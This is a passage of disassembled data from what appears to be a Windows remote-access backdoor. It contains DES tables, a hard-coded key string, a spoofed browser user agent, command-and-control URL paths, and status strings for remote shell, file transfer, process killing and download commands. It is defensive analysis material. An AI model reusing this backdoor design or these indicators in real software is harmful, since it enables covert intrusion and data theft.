aUnaligned      db '__unaligned',0      ; DATA XREF: .rdata:00421AAC↓o
aRestrict       db '__restrict',0       ; DATA XREF: .rdata:00421AA8↓o
                align 4
aPtr64          db '__ptr64',0          ; DATA XREF: .rdata:00421AA4↓o
aClrcall        db '__clrcall',0        ; DATA XREF: .rdata:00421AA0↓o
                align 10h
aFastcall       db '__fastcall',0       ; DATA XREF: .rdata:00421A9C↓o
                align 4
aThiscall       db '__thiscall',0       ; DATA XREF: .rdata:00421A98↓o
                align 4
aStdcall        db '__stdcall',0        ; DATA XREF: .rdata:00421A94↓o
                align 4
aPascal         db '__pascal',0         ; DATA XREF: .rdata:00421A90↓o
                align 10h
aCdecl          db '__cdecl',0          ; DATA XREF: .rdata:00421A8C↓o
aBased          db '__based(',0         ; DATA XREF: .rdata:00421A88↓o
                align 8
                dd offset aBased        ; "__based("
                dd offset aCdecl        ; "__cdecl"
                dd offset aPascal       ; "__pascal"
                dd offset aStdcall      ; "__stdcall"
                dd offset aThiscall     ; "__thiscall"
                dd offset aFastcall     ; "__fastcall"
                dd offset aClrcall      ; "__clrcall"
                dd offset aPtr64        ; "__ptr64"
                dd offset aRestrict     ; "__restrict"
                dd offset aUnaligned    ; "__unaligned"
                dd offset szProxyBypass
                dd offset aTypeDescriptor ; " Type Descriptor'"
                dd offset aBaseClassDescr ; " Base Class Descriptor at ("
                dd offset aBaseClassArray ; " Base Class Array'"
                dd offset aClassHierarchy ; " Class Hierarchy Descriptor'"
                dd offset aCompleteObject ; " Complete Object Locator'"
                dd offset aNew_0        ; " new"
                dd offset aDelete_0     ; " delete"
                dd offset asc_422334    ; "="
                dd offset asc_421A00    ; ">>"
                dd offset asc_4219FC    ; "<<"
                dd offset asc_4219F8    ; "!"
                dd offset asc_4219F4    ; "=="
                dd offset asc_4219F0    ; "!="
                dd offset asc_4219EC    ; "[]"
                dd offset aOperator     ; "operator"
                dd offset asc_4219DC    ; "->"
                dd offset asc_4219D8    ; "*"
                dd offset asc_4219D4    ; "++"
                dd offset asc_4219D0    ; "--"
                dd offset asc_4219CC    ; "-"
                dd offset asc_4219C8    ; "+"
                dd offset asc_4219C4    ; "&"
                dd offset asc_4219C0    ; "->*"
                dd offset asc_4219BC    ; "/"
                dd offset asc_4219B8    ; "%"
                dd offset asc_4219B4    ; "<"
                dd offset asc_4219B0    ; "<="
                dd offset asc_422674    ; ">"
                dd offset asc_4219AC    ; ">="
                dd offset asc_4219A8    ; ","
                dd offset asc_4219A4    ; "()"
                dd offset asc_4219A0    ; "~"
                dd offset asc_42199C    ; "^"
                dd offset asc_421998    ; "|"
                dd offset asc_421994    ; "&&"
                dd offset asc_421990    ; "||"
                dd offset asc_42198C    ; "*="
                dd offset asc_421988    ; "+="
                dd offset asc_421984    ; "-="
                dd offset asc_421980    ; "/="
                dd offset asc_42197C    ; "%="
                dd offset asc_421978    ; ">>="
                dd offset asc_421974    ; "<<="
                dd offset asc_421970    ; "&="
                dd offset asc_42196C    ; "|="
                dd offset asc_421968    ; "^="
                dd offset aVftable      ; "`vftable'"
                dd offset aVbtable      ; "`vbtable'"
                dd offset aVcall        ; "`vcall'"
                dd offset aTypeof       ; "`typeof'"
                dd offset aLocalStaticGua ; "`local static guard'"
                dd offset aString       ; "`string'"
                dd offset aVbaseDestructo ; "`vbase destructor'"
                dd offset aVectorDeleting ; "`vector deleting destructor'"
                dd offset aDefaultConstru ; "`default constructor closure'"
                dd offset aScalarDeleting ; "`scalar deleting destructor'"
                dd offset aVectorConstruc ; "`vector constructor iterator'"
                dd offset aVectorDestruct ; "`vector destructor iterator'"
                dd offset aVectorVbaseCon ; "`vector vbase constructor iterator'"
                dd offset aVirtualDisplac ; "`virtual displacement map'"
                dd offset aEhVectorConstr ; "`eh vector constructor iterator'"
                dd offset aEhVectorDestru ; "`eh vector destructor iterator'"
                dd offset aEhVectorVbaseC_0 ; "`eh vector vbase constructor iterator'"
                dd offset aCopyConstructo ; "`copy constructor closure'"
                dd offset aUdtReturning ; "`udt returning'"
                dd offset aEh           ; "`EH"
                dd offset aRtti         ; "`RTTI"
                dd offset aLocalVftable ; "`local vftable'"
                dd offset aLocalVftableCo ; "`local vftable constructor closure'"
                dd offset aNew          ; " new[]"
                dd offset aDelete       ; " delete[]"
                dd offset aOmniCallsig  ; "`omni callsig'"
                dd offset aPlacementDelet_0 ; "`placement delete closure'"
                dd offset aPlacementDelet ; "`placement delete[] closure'"
                dd offset aManagedVectorC_0 ; "`managed vector constructor iterator'"
                dd offset aManagedVectorD ; "`managed vector destructor iterator'"
                dd offset aEhVectorCopyCo ; "`eh vector copy constructor iterator'"
                dd offset aEhVectorVbaseC ; "`eh vector vbase copy constructor itera"...
                dd offset aDynamicInitial ; "`dynamic initializer for '"
                dd offset aDynamicAtexitD ; "`dynamic atexit destructor for '"
                dd offset aVectorCopyCons ; "`vector copy constructor iterator'"
                dd offset aVectorVbaseCop ; "`vector vbase copy constructor iterator"...
                dd offset aManagedVectorC ; "`managed vector copy constructor iterat"...
                dd offset aLocalStaticThr ; "`local static thread guard'"
                dd offset szProxyBypass
; CHAR aGetprocesswind[]
aGetprocesswind db 'GetProcessWindowStation',0
                                        ; DATA XREF: sub_41C65F+9D↑o
; CHAR aGetuserobjecti[]
aGetuserobjecti db 'GetUserObjectInformationA',0
                                        ; DATA XREF: sub_41C65F+7E↑o
                align 4
; CHAR aGetlastactivep[]
aGetlastactivep db 'GetLastActivePopup',0
                                        ; DATA XREF: sub_41C65F+69↑o
                align 10h
; CHAR aGetactivewindo[]
aGetactivewindo db 'GetActiveWindow',0  ; DATA XREF: sub_41C65F+54↑o
; CHAR aMessageboxa[]
aMessageboxa    db 'MessageBoxA',0      ; DATA XREF: sub_41C65F+3E↑o
; CHAR LibFileName[]
LibFileName     db 'USER32.DLL',0       ; DATA XREF: sub_41C65F+23↑o
                align 4
aSunmontuewedth db 'SunMonTueWedThuFriSat',0
                align 10h
aJanfebmaraprma db 'JanFebMarAprMayJunJulAugSepOctNovDec',0
                align 4
; CHAR FileName[]
FileName        db 'CONOUT$',0          ; DATA XREF: sub_41CF17+E↑o
a1Qnan          db '1#QNAN',0           ; DATA XREF: sub_41D4A9:loc_41D5DF↑o
                align 4
a1Inf           db '1#INF',0            ; DATA XREF: sub_41D4A9+10A↑o
                align 10h
a1Ind           db '1#IND',0            ; DATA XREF: sub_41D4A9+FB↑o
                align 4
a1Snan          db '1#SNAN',0           ; DATA XREF: sub_41D4A9+E3↑o
                align 10h
aBadAllocation  db 'bad allocation',0   ; DATA XREF: .data:00425000↓o
                                        ; .data:00425004↓o ...
                align 10h
aAbcdefghijklmn db 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',0
                                        ; DATA XREF: sub_4012C0+89↑o
                                        ; sub_4012C0+CE↑o ...
                align 8
a54phoenix      db '&54phoenix@#$',0
                align 4
byte_421D48     db 3Ah                  ; DATA XREF: sub_40BAD0:loc_40BB00↑r
byte_421D49     db 32h                  ; DATA XREF: sub_40BAD0+45↑r
byte_421D4A     db 2Ah                  ; DATA XREF: sub_40BAD0+5A↑r
byte_421D4B     db 22h                  ; DATA XREF: sub_40BAD0+6F↑r
                db  1Ah
                db  12h
                db  0Ah
                db    2
                db  3Ch ; <
                db  34h ; 4
                db  2Ch ; ,
                db  24h ; $
                db  1Ch
                db  14h
                db  0Ch
                db    4
                db  3Eh ; >
                db  36h ; 6
                db  2Eh ; .
                db  26h ; &
                db  1Eh
                db  16h
                db  0Eh
                db    6
                db  40h ; @
                db  38h ; 8
                db  30h ; 0
                db  28h ; (
                db  20h
                db  18h
                db  10h
                db    8
                db  39h ; 9
                db  31h ; 1
                db  29h ; )
                db  21h ; !
                db  19h
                db  11h
                db    9
                db    1
                db  3Bh ; ;
                db  33h ; 3
                db  2Bh ; +
                db  23h ; #
                db  1Bh
                db  13h
                db  0Bh
                db    3
                db  3Dh ; =
                db  35h ; 5
                db  2Dh ; -
                db  25h ; %
                db  1Dh
                db  15h
                db  0Dh
                db    5
                db  3Fh ; ?
                db  37h ; 7
                db  2Fh ; /
                db  27h ; '
                db  1Fh
                db  17h
                db  0Fh
                db    7
byte_421D88     db 28h                  ; DATA XREF: sub_40BAD0:loc_40BCA0↑r
byte_421D89     db 8                    ; DATA XREF: sub_40BAD0+1E5↑r
byte_421D8A     db 30h                  ; DATA XREF: sub_40BAD0+1FA↑r
byte_421D8B     db 10h                  ; DATA XREF: sub_40BAD0+20F↑r
                db  38h ; 8
                db  18h
                db  40h ; @
                db  20h
                db  27h ; '
                db    7
                db  2Fh ; /
                db  0Fh
                db  37h ; 7
                db  17h
                db  3Fh ; ?
                db  1Fh
                db  26h ; &
                db    6
                db  2Eh ; .
                db  0Eh
                db  36h ; 6
                db  16h
                db  3Eh ; >
                db  1Eh
                db  25h ; %
                db    5
                db  2Dh ; -
                db  0Dh
                db  35h ; 5
                db  15h
                db  3Dh ; =
                db  1Dh
                db  24h ; $
                db    4
                db  2Ch ; ,
                db  0Ch
                db  34h ; 4
                db  14h
                db  3Ch ; <
                db  1Ch
                db  23h ; #
                db    3
                db  2Bh ; +
                db  0Bh
                db  33h ; 3
                db  13h
                db  3Bh ; ;
                db  1Bh
                db  22h ; "
                db    2
                db  2Ah ; *
                db  0Ah
                db  32h ; 2
                db  12h
                db  3Ah ; :
                db  1Ah
                db  21h ; !
                db    1
                db  29h ; )
                db    9
                db  31h ; 1
                db  11h
                db  39h ; 9
                db  19h
byte_421DC8     db 20h                  ; DATA XREF: sub_40BF20:loc_40BF23↑r
byte_421DC9     db 1                    ; DATA XREF: sub_40BF20+16↑r
byte_421DCA     db 2                    ; DATA XREF: sub_40BF20+29↑r
byte_421DCB     db 3                    ; DATA XREF: sub_40BF20+3C↑r
byte_421DCC     db 4                    ; DATA XREF: sub_40BF20+4F↑r
byte_421DCD     db 5                    ; DATA XREF: sub_40BF20+62↑r
                db    4
                db    5
                db    6
                db    7
                db    8
                db    9
                db    8
                db    9
                db  0Ah
                db  0Bh
                db  0Ch
                db  0Dh
                db  0Ch
                db  0Dh
                db  0Eh
                db  0Fh
                db  10h
                db  11h
                db  10h
                db  11h
                db  12h
                db  13h
                db  14h
                db  15h
                db  14h
                db  15h
                db  16h
                db  17h
                db  18h
                db  19h
                db  18h
                db  19h
                db  1Ah
                db  1Bh
                db  1Ch
                db  1Dh
                db  1Ch
                db  1Dh
                db  1Eh
                db  1Fh
                db  20h
                db    1
byte_421DF8     db 10h                  ; DATA XREF: sub_40BF20:loc_40C020↑r
byte_421DF9     db 7                    ; DATA XREF: sub_40BF20+113↑r
byte_421DFA     db 14h                  ; DATA XREF: sub_40BF20+126↑r
byte_421DFB     db 15h                  ; DATA XREF: sub_40BF20+139↑r
                db  1Dh
                db  0Ch
                db  1Ch
                db  11h
                db    1
                db  0Fh
                db  17h
                db  1Ah
                db    5
                db  12h
                db  1Fh
                db  0Ah
                db    2
                db    8
                db  18h
                db  0Eh
                db  20h
                db  1Bh
                db    3
                db    9
                db  13h
                db  0Dh
                db  1Eh
                db    6
                db  16h
                db  0Bh
                db    4
                db  19h
byte_421E18     db 39h                  ; DATA XREF: sub_40BD30:loc_40BD60↑r
byte_421E19     db 31h                  ; DATA XREF: sub_40BD30+45↑r
byte_421E1A     db 29h                  ; DATA XREF: sub_40BD30+5A↑r
byte_421E1B     db 21h                  ; DATA XREF: sub_40BD30+6F↑r
                db  19h
                db  11h
                db    9
                db    1
                db  3Ah ; :
                db  32h ; 2
                db  2Ah ; *
                db  22h ; "
                db  1Ah
                db  12h
                db  0Ah
                db    2
                db  3Bh ; ;
                db  33h ; 3
                db  2Bh ; +
                db  23h ; #
                db  1Bh
                db  13h
                db  0Bh
                db    3
                db  3Ch ; <
                db  34h ; 4
                db  2Ch ; ,
                db  24h ; $
                db  3Fh ; ?
                db  37h ; 7
                db  2Fh ; /
                db  27h ; '
                db  1Fh
                db  17h
                db  0Fh
                db    7
                db  3Eh ; >
                db  36h ; 6
                db  2Eh ; .
                db  26h ; &
                db  1Eh
                db  16h
                db  0Eh
                db    6
                db  3Dh ; =
                db  35h ; 5
                db  2Dh ; -
                db  25h ; %
                db  1Dh
                db  15h
                db  0Dh
                db    5
                db  1Ch
                db  14h
                db  0Ch
                db    4
byte_421E50     db 0Eh                  ; DATA XREF: sub_40BD30:loc_40BE60↑r
byte_421E51     db 11h                  ; DATA XREF: sub_40BD30+145↑r
byte_421E52     db 0Bh                  ; DATA XREF: sub_40BD30+15A↑r
byte_421E53     db 18h                  ; DATA XREF: sub_40BD30+16F↑r
byte_421E54     db 1                    ; DATA XREF: sub_40BD30+184↑r
byte_421E55     db 5                    ; DATA XREF: sub_40BD30+199↑r
                db    3
                db  1Ch
                db  0Fh
                db    6
                db  15h
                db  0Ah
                db  17h
                db  13h
                db  0Ch
                db    4
                db  1Ah
                db    8
                db  10h
                db    7
                db  1Bh
                db  14h
                db  0Dh
                db    2
                db  29h ; )
                db  34h ; 4
                db  1Fh
                db  25h ; %
                db  2Fh ; /
                db  37h ; 7
                db  1Eh
                db  28h ; (
                db  33h ; 3
                db  2Dh ; -
                db  21h ; !
                db  30h ; 0
                db  2Ch ; ,
                db  31h ; 1
                db  27h ; '
                db  38h ; 8
                db  22h ; "
                db  35h ; 5
                db  2Eh ; .
                db  2Ah ; *
                db  32h ; 2
                db  24h ; $
                db  1Dh
                db  20h
byte_421E80     db 1                    ; DATA XREF: sub_40BD30:loc_40BDE0↑r
                                        ; sub_40BD30+EB↑r
                db    1
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    1
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    1
unk_421E90      db  0Eh                 ; DATA XREF: sub_40C090+34↑o
                db    4
                db  0Dh
                db    1
                db    2
                db  0Fh
                db  0Bh
                db    8
                db    3
                db  0Ah
                db    6
                db  0Ch
                db    5
                db    9
                db    0
                db    7
                db    0
                db  0Fh
                db    7
                db    4
                db  0Eh
                db    2
                db  0Dh
                db    1
                db  0Ah
                db    6
                db  0Ch
                db  0Bh
                db    9
                db    5
                db    3
                db    8
                db    4
                db    1
                db  0Eh
                db    8
                db  0Dh
                db    6
                db    2
                db  0Bh
                db  0Fh
                db  0Ch
                db    9
                db    7
                db    3
                db  0Ah
                db    5
                db    0
                db  0Fh
                db  0Ch
                db    8
                db    2
                db    4
                db    9
                db    1
                db    7
                db    5
                db  0Bh
                db    3
                db  0Eh
                db  0Ah
                db    0
                db    6
                db  0Dh
                db  0Fh
                db    1
                db    8
                db  0Eh
                db    6
                db  0Bh
                db    3
                db    4
                db    9
                db    7
                db    2
                db  0Dh
                db  0Ch
                db    0
                db    5
                db  0Ah
                db    3
                db  0Dh
                db    4
                db    7
                db  0Fh
                db    2
                db    8
                db  0Eh
                db  0Ch
                db    0
                db    1
                db  0Ah
                db    6
                db    9
                db  0Bh
                db    5
                db    0
                db  0Eh
                db    7
                db  0Bh
                db  0Ah
                db    4
                db  0Dh
                db    1
                db    5
                db    8
                db  0Ch
                db    6
                db    9
                db    3
                db    2
                db  0Fh
                db  0Dh
                db    8
                db  0Ah
                db    1
                db    3
                db  0Fh
                db    4
                db    2
                db  0Bh
                db    6
                db    7
                db  0Ch
                db    0
                db    5
                db  0Eh
                db    9
                db  0Ah
                db    0
                db    9
                db  0Eh
                db    6
                db    3
                db  0Fh
                db    5
                db    1
                db  0Dh
                db  0Ch
                db    7
                db  0Bh
                db    4
                db    2
                db    8
                db  0Dh
                db    7
                db    0
                db    9
                db    3
                db    4
                db    6
                db  0Ah
                db    2
                db    8
                db    5
                db  0Eh
                db  0Ch
                db  0Bh
                db  0Fh
                db    1
                db  0Dh
                db    6
                db    4
                db    9
                db    8
                db  0Fh
                db    3
                db    0
                db  0Bh
                db    1
                db    2
                db  0Ch
                db    5
                db  0Ah
                db  0Eh
                db    7
                db    1
                db  0Ah
                db  0Dh
                db    0
                db    6
                db    9
                db    8
                db    7
                db    4
                db  0Fh
                db  0Eh
                db    3
                db  0Bh
                db    5
                db    2
                db  0Ch
                db    7
                db  0Dh
                db  0Eh
                db    3
                db    0
                db    6
                db    9
                db  0Ah
                db    1
                db    2
                db    8
                db    5
                db  0Bh
                db  0Ch
                db    4
                db  0Fh
                db  0Dh
                db    8
                db  0Bh
                db    5
                db    6
                db  0Fh
                db    0
                db    3
                db    4
                db    7
                db    2
                db  0Ch
                db    1
                db  0Ah
                db  0Eh
                db    9
                db  0Ah
                db    6
                db    9
                db    0
                db  0Ch
                db  0Bh
                db    7
                db  0Dh
                db  0Fh
                db    1
                db    3
                db  0Eh
                db    5
                db    2
                db    8
                db    4
                db    3
                db  0Fh
                db    0
                db    6
                db  0Ah
                db    1
                db  0Dh
                db    8
                db    9
                db    4
                db    5
                db  0Bh
                db  0Ch
                db    7
                db    2
                db  0Eh
                db    2
                db  0Ch
                db    4
                db    1
                db    7
                db  0Ah
                db  0Bh
                db    6
                db    8
                db    5
                db    3
                db  0Fh
                db  0Dh
                db    0
                db  0Eh
                db    9
                db  0Eh
                db  0Bh
                db    2
                db  0Ch
                db    4
                db    7
                db  0Dh
                db    1
                db    5
                db    0
                db  0Fh
                db  0Ah
                db    3
                db    9
                db    8
                db    6
                db    4
                db    2
                db    1
                db  0Bh
                db  0Ah
                db  0Dh
                db    7
                db    8
                db  0Fh
                db    9
                db  0Ch
                db    5
                db    6
                db    3
                db    0
                db  0Eh
                db  0Bh
                db    8
                db  0Ch
                db    7
                db    1
                db  0Eh
                db    2
                db  0Dh
                db    6
                db  0Fh
                db    0
                db    9
                db  0Ah
                db    4
                db    5
                db    3
                db  0Ch
                db    1
                db  0Ah
                db  0Fh
                db    9
                db    2
                db    6
                db    8
                db    0
                db  0Dh
                db    3
                db    4
                db  0Eh
                db    7
                db    5
                db  0Bh
                db  0Ah
                db  0Fh
                db    4
                db    2
                db    7
                db  0Ch
                db    9
                db    5
                db    6
                db    1
                db  0Dh
                db  0Eh
                db    0
                db  0Bh
                db    3
                db    8
                db    9
                db  0Eh
                db  0Fh
                db    5
                db    2
                db    8
                db  0Ch
                db    3
                db    7
                db    0
                db    4
                db  0Ah
                db    1
                db  0Dh
                db  0Bh
                db    6
                db    4
                db    3
                db    2
                db  0Ch
                db    9
                db    5
                db  0Fh
                db  0Ah
                db  0Bh
                db  0Eh
                db    1
                db    7
                db    6
                db    0
                db    8
                db  0Dh
                db    4
                db  0Bh
                db    2
                db  0Eh
                db  0Fh
                db    0
                db    8
                db  0Dh
                db    3
                db  0Ch
                db    9
                db    7
                db    5
                db  0Ah
                db    6
                db    1
                db  0Dh
                db    0
                db  0Bh
                db    7
                db    4
                db    9
                db    1
                db  0Ah
                db  0Eh
                db    3
                db    5
                db  0Ch
                db    2
                db  0Fh
                db    8
                db    6
                db    1
                db    4
                db  0Bh
                db  0Dh
                db  0Ch
                db    3
                db    7
                db  0Eh
                db  0Ah
                db  0Fh
                db    6
                db    8
                db    0
                db    5
                db    9
                db    2
                db    6
                db  0Bh
                db  0Dh
                db    8
                db    1
                db    4
                db  0Ah
                db    7
                db    9
                db    5
                db    0
                db  0Fh
                db  0Eh
                db    2
                db    3
                db  0Ch
                db  0Dh
                db    2
                db    8
                db    4
                db    6
                db  0Fh
                db  0Bh
                db    1
                db  0Ah
                db    9
                db    3
                db  0Eh
                db    5
                db    0
                db  0Ch
                db    7
                db    1
                db  0Fh
                db  0Dh
                db    8
                db  0Ah
                db    3
                db    7
                db    4
                db  0Ch
                db    5
                db    6
                db  0Bh
                db    0
                db  0Eh
                db    9
                db    2
                db    7
                db  0Bh
                db    4
                db    1
                db    9
                db  0Ch
                db  0Eh
                db    2
                db    0
                db    6
                db  0Ah
                db  0Dh
                db  0Fh
                db    3
                db    5
                db    8
                db    2
                db    1
                db  0Eh
                db    7
                db    4
                db  0Ah
                db    8
                db  0Dh
                db  0Fh
                db  0Ch
                db    9
                db    0
                db    3
                db    5
                db    6
                db  0Bh
byte_422090     db 41h                  ; DATA XREF: sub_401AE0+95↑r
                                        ; sub_403B80+EF↑r
aBcdefghijklmno db 'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+',0
; CHAR szProxyBypass[8]
szProxyBypass   db 8 dup(0)             ; DATA XREF: sub_401E10+3A7↑o
                                        ; sub_4027B0+52↑o ...
; CHAR szAgent[]
szAgent         db 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .'
                                        ; DATA XREF: sub_40DF40:loc_40DF74↑o
                db 'NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',0
; CHAR szVerb[]
szVerb          db 'GET',0              ; DATA XREF: sub_401E10+135↑o
                                        ; sub_401E10+1FA↑o ...
aX86            db 'x86',0              ; DATA XREF: sub_401E10+285↑o
                                        ; sub_402A00:loc_402E46↑o ...
aUaCpu          db 'UA-CPU',0           ; DATA XREF: sub_401E10+28A↑o
                                        ; sub_402A00+44B↑o ...
                align 4
aTextHtmlQ09Tex db 'text/html;q=0.9,text/plain;q=0.8,application/xhtml+xml;q=0.7,imag'
                                        ; DATA XREF: sub_401E10+2D9↑o
                                        ; sub_402A00+455↑o ...
                db 'e/gif;q=0.5,*/*;q=0.1',0
                align 10h
aAccept         db 'Accept',0           ; DATA XREF: sub_401E10+2DE↑o
                                        ; sub_402A00+45A↑o ...
                align 4
aEnUs           db 'en-us',0            ; DATA XREF: sub_401E10+327↑o
                                        ; sub_402A00+464↑o ...
                align 10h
aAcceptLanguage db 'Accept-Language',0  ; DATA XREF: sub_401E10+32C↑o
                                        ; sub_402A00+469↑o ...
aGzipQ08Deflate db 'gzip;q=0.8, deflate;q=0.5',0
                                        ; DATA XREF: sub_401E10+375↑o
                                        ; sub_402A00+473↑o ...
                align 4
aAcceptEncoding db 'Accept-Encoding',0  ; DATA XREF: sub_401E10+37A↑o
                                        ; sub_402A00+478↑o ...
aClip           db 'CLIP',0             ; DATA XREF: sub_401E10+42A↑o
                                        ; sub_402A00+115↑o
                align 4
aCookie         db 'Cookie',0           ; DATA XREF: sub_401E10+49A↑o
                                        ; sub_402A00:loc_402E95↑o ...
                align 4
aSf             db 'sf',0               ; DATA XREF: sub_402A00+193↑o
                                        ; .text:0040302C↑o
                align 10h
aCf             db 'cf',0               ; DATA XREF: sub_402A00+1ED↑o
                                        ; .text:0040307F↑o
                align 4
aSfl            db 'sfl',0              ; DATA XREF: sub_402A00+231↑o
                                        ; .text:004030C3↑o
aCfl            db 'cfl',0              ; DATA XREF: sub_402A00+245↑o
                                        ; .text:004030D7↑o
aDummy          db 'dummy',0            ; DATA XREF: sub_402A00+268↑o
                                        ; .text:004030FA↑o ...
                align 4
aSy             db 'sy',0               ; DATA XREF: sub_402A00+2C3↑o
                                        ; .text:00403155↑o ...
                align 4
aS              db 's',0                ; DATA XREF: sub_402A00+2EC↑o
                                        ; .text:0040317E↑o ...
                align 4
aMuid           db 'MUID',0             ; DATA XREF: sub_402A00+350↑o
                                        ; .text:004031E2↑o
                align 4
aUcServerDataFo db '/uc_server/data/forum.asp',0
                                        ; DATA XREF: .text:0040323F↑o
                                        ; .text:00403262↑o
                align 10h
; CHAR aPost[]
aPost           db 'POST',0             ; DATA XREF: .text:00403244↑o
                                        ; .text:00403267↑o ...
                align 4
aMultipartFormD db 'multipart/form-data; boundary=---------------------------7d6ea2d4'
                                        ; DATA XREF: .text:00403321↑o
                                        ; sub_404940+10F↑o
                db '05fc',0
                align 10h
aContentType    db 'Content-Type',0     ; DATA XREF: .text:00403326↑o
                                        ; sub_404940+114↑o
                align 10h
aRb             db 'rb',0               ; DATA XREF: .text:00403334↑o
                                        ; .text:00403384↑o ...
                align 4
aUrlDownloadSuc db 0Ah                  ; DATA XREF: sub_403800+68↑o
                db 'URL download success!',0
                align 4
aUrlDownloadFai db 0Ah                  ; DATA XREF: sub_403800+CE↑o
                db 'URL download failed with error code : %d',0
                align 4
aName           db 'NAME',0             ; DATA XREF: sub_4041F0+122↑o
                align 10h
aAddr           db 'ADDR',0             ; DATA XREF: sub_4041F0+17F↑o
                align 4
aMark           db 'MARK',0             ; DATA XREF: sub_4041F0+1CA↑o
                align 10h
aDD             db '%d.%d',0            ; DATA XREF: sub_4041F0+219↑o
                align 4
aOsv            db 'OSV',0              ; DATA XREF: sub_4041F0+23B↑o
aHdsn           db 'HDSN',0             ; DATA XREF: sub_4041F0+292↑o
                align 4
asc_422334      db '=',0                ; DATA XREF: sub_401E10+43A↑o
                                        ; sub_402A00+125↑o ...
                align 4
aServ           db 'serv',0             ; DATA XREF: sub_404800+AA↑o
                align 10h
; CHAR szObjectName[]
szObjectName    db '/classic/acount/image/addr_member.asp',0
                                        ; DATA XREF: sub_404940+38↑o
                                        ; sub_404940+67↑o
                align 4
aAb             db 'ab',0               ; DATA XREF: sub_404BF0+88↑o
                align 4
aWriteFileError db 'Write file error!',0
                                        ; DATA XREF: sub_404BF0+1ED↑o
                align 10h
aCt             db 'ct',0               ; DATA XREF: sub_4052B0+143↑o
                align 4
aPl             db 'pl',0               ; DATA XREF: sub_4052B0+193↑o
                align 4
aPk             db 'pk',0               ; DATA XREF: sub_4052B0+1B8↑o
                align 4
aPf             db 'pf',0               ; DATA XREF: sub_4052B0+1E4↑o
                align 10h
aGf             db 'gf',0               ; DATA XREF: sub_4052B0+210↑o
                align 4
aRa             db 'ra',0               ; DATA XREF: sub_4052B0+23C↑o
                align 4
aUd             db 'ud',0               ; DATA XREF: sub_4052B0+268↑o
                align 4
aEx             db 'ex',0               ; DATA XREF: sub_4052B0+294↑o
                align 10h
aSex            db 'sex',0              ; DATA XREF: sub_4052B0+2C0↑o
aSs             db 'ss',0               ; DATA XREF: sub_4052B0+2E5↑o
                align 4
aShe            db 'she',0              ; DATA XREF: sub_4052B0+30A↑o
aSos            db 'sos',0              ; DATA XREF: sub_4052B0+336↑o
aOshe           db 'oshe',0             ; DATA XREF: sub_4052B0+35B↑o
                align 4
aSrss           db 'srss',0             ; DATA XREF: sub_4052B0+387↑o
                align 10h
aRsse           db 'rsse',0             ; DATA XREF: sub_4052B0+3AC↑o
                align 4
aSl             db 'sl',0               ; DATA XREF: sub_4052B0+3D5↑o
                align 4
aClientDoesNotS db 0Ah                  ; DATA XREF: sub_4052B0+400↑o
                db 'Client does not support this command!',0
                align 4
aJ              db 'J',0                ; DATA XREF: sub_405850+77↑o
                                        ; sub_4059A0+7D↑o ...
                align 4
aKillProcessSuc db 'Kill process success!',0
                                        ; DATA XREF: sub_405850+CC↑o
                align 10h
aKillProcessFai db 'Kill process failed!',0
                                        ; DATA XREF: sub_405850+D5↑o
                align 4
aM              db 'M',0                ; DATA XREF: sub_4059A0+AA↑o
                                        ; sub_405C60+AA↑o ...
                align 4
aS_0            db 'S',0                ; DATA XREF: sub_4059A0+BE↑o
                                        ; sub_405C60+BE↑o ...
                align 10h
aR              db 'r',0                ; DATA XREF: sub_4059A0+E0↑o
                align 4
aWb             db 'wb',0               ; DATA XREF: sub_4059A0+FC↑o
                align 4
aPutfileCancele db 'Putfile canceled for : Can not create file on client with err cod'
                                        ; DATA XREF: sub_4059A0+13F↑o
                db 'e:%d',0
                align 10h
aPutfileCancele_0 db 'Putfile canceled for : Serverfile is not bigger than Clientfile!',0
                                        ; DATA XREF: sub_4059A0+1F3↑o
                align 8
aGetfileCancele db 0Ah                  ; DATA XREF: sub_405C60+123↑o
                db 'Getfile canceled for : Can not open file on client with err code:'
                db '%d',0
                align 10h
aGetfileCancele_0 db 'Getfile canceled for : Clientfile is not bigger than Serverfile!',0
                                        ; DATA XREF: sub_405C60+1D7↑o
                align 4
asc_422554      db 'H',0                ; DATA XREF: sub_405F00+182↑o
                align 4
aRunasSuccess   db 0Ah                  ; DATA XREF: sub_405F00+2BA↑o
                db 'Runas Success!',0
aRunasFailedWit db 0Ah                  ; DATA XREF: sub_405F00+329↑o
                db 'Runas failed with error code : %d',0
                align 4
aExecSuccess    db 0Ah                  ; DATA XREF: sub_4062E0+E1↑o
                db 'Exec Success!',0
                align 4
aExecFailedWith db 0Ah                  ; DATA XREF: sub_4062E0+150↑o
                db 'Exec failed with error code : %d',0
                align 10h
aServiceExecHav db 'service exec have not implemented',0Ah,0
                                        ; DATA XREF: sub_4064E0+55↑o
                align 4
aFailToStartDow db 0Ah                  ; DATA XREF: sub_406690+CB↑o
                db 'Fail to start download thread!',0
dword_422604    dd 646D635Ch            ; DATA XREF: sub_4067C0+7B↑r
dword_422608    dd 6578652Eh            ; DATA XREF: sub_4067C0+81↑r
byte_42260C     db 0                    ; DATA XREF: sub_4067C0+89↑r
                align 10h
aCreateCmdShell db 0Ah                  ; DATA XREF: sub_4067C0+1CB↑o
                db 'Create cmd shell failed with err code:%d',0
                align 4
aCanNotGetCurre db 'Can not get current directory with error code : %d',0
                                        ; DATA XREF: sub_406A40+94↑o
                align 10h
asc_422670      db 0Ah,0                ; DATA XREF: sub_406A40+10F↑o
                                        ; sub_407110+3CA↑o
                align 4
asc_422674      db '>',0                ; DATA XREF: sub_406A40+1D1↑o
                                        ; sub_407110+47C↑o ...
                align 4
; CHAR Name[]
Name            db '\\.\pipe\ssnp',0    ; DATA XREF: sub_406C90+8F↑o
                align 4
aCreateNamedPip db 0Ah                  ; DATA XREF: sub_406C90+D3↑o
                db 'Create named pipe failed with error code : %d',0
                align 4
aWaitNamedPipeC db 0Ah                  ; DATA XREF: sub_406C90+1D4↑o
                db 'Wait named pipe connect time out',0
                align 4
aFailedToWriteN db 0Ah                  ; DATA XREF: sub_406C90+298↑o
                                        ; sub_407620+11E↑o
                db 'Failed to write named pipe with error code : %d',0
                align 10h
aConnectNamedPi db 0Ah                  ; DATA XREF: sub_406C90+318↑o
